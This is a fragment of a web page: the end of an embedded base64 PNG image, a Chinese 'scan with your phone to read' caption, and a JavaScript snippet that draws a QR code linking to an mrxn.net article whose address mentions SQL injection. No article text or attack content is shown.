x//ga2n7IynYqjrX0yvuKxZraH2lE/c/bpsXplPbP+M03/iu29yld95j2z5/WG1Ft8g/U1kMMh/H5y92OvR/D1qtxzxl9hX+XKvd49q65fTc+M9XSuXnNVy9p9wnrk5CvUw1Wv6+REegbG+qKJ6w3xdt6Et2/qTugrfOYz+BTItUat71k9rvUay7VWTbamevpar7o1lfXIeo0rH+XsqUeu9dcbUm/jDdbbQJzeGT5zbvt0r3q4PyHRgl6TuHujBfGLxBXWmJ+xfnPWVDbXvcaVu7fm7KlHrp5tIFW81q+7gd1AnOKMV8ecTXrlrX17Xc1lveoRPfkVkg/sry/aM1gTXnln/dQ61x7pGVQt62hiN5AYLrzuBq6BvO7upzu/xUB8XeXZSXuux7Mav3yYM57xzOMe+vXMWK8886jZb8ZvMRAPevHHz/zXgJz07ELNydWjJtdcX688PpEztsdRTo/9q9dcZz1dr/HM4x7V19fXG9Jv5MXxbiBOdsars+r1Cahsbsb2M2c8Yz1y3WO17n2qzz7dcxRbf+Qxp9d9wuayXmE3EIsufs0NbANxomd4ddTZ1Ffeqvc9zdV+anprrq/1HnHvc+Q15z69NroeOVqgN2yuc3JiG0g3XfFrbuAayGvufbnrfwAAAP//jw688wAAAAZJREFUAwCEwreMCfj/WAAAAABJRU5ErkJggg==)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/api-wxapps-doPageGetFormCon-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 